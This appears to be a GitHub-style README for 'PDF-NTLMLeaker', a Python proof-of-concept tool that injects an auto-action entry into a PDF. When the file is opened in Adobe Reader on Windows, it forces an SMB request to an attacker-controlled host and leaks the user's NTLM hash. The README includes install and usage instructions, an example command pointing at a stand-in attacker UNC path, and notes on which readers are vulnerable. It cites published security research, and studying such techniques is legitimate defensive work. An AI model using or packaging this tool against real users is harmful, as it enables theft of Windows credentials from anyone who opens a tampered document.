# PDF-NTLMLeaker v0.1

## Description


This script implements the Proof of Concept attack from the Checkpoint research ["NTLM Credentials Theft via PDF Files"](https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/)

Basically, this Python script will inject in any given pdf a /AA entry that when parsed by the PDF reader will request a remote file in a server controlled by the attacker leaking the NTLM hash of any user that open that pdf document in a windows host. 

During my tests with the script I verified that this attack works nicely in the Adobe Acrobat Reader. But my tests failed in browser PDF readers (Edge, Firefox and Chrome) and also in the Foxit Reader 9.1.


## Install

Install required libraries with:

```
pip install pdfrw
```

## Example

```
$ python3 PDF-NTLMLeaker.py -h

========================================================================
|                         PDF-NTLMLeaker v0.1                          |
|                               by pimps                               |
========================================================================

usage: PDF-NTLMLeaker.py [-h] [-o OUTPUT] input path

positional arguments:
  input                       PDF file to be used as input.
  path                        UNC path of malicious SMB Server/Responder host
                              (ex: \\malicious.com\dumb_file.pdf)

optional arguments:
  -h, --help                  show this help message and exit
  -o OUTPUT, --output OUTPUT  Name of the output file. (default:
                              modified_file.pdf)

This script will inject a malicious metadata in a PDF file to force it leak
the NTLM hash of any user that open that file in a Windows host.

```


```

$ python3 PDF-NTLMLeaker.py sample.pdf '\\attacker.domain\gimmehashz.pdf'

========================================================================
|                         PDF-NTLMLeaker v0.1                          |
|                               by pimps                               |
========================================================================

[*] Reading PDF file: sample.pdf
[*] Injecting the payload in the PDF file...
[*] Saving modified PDF as: modified_file.pdf
[*] Done!

```

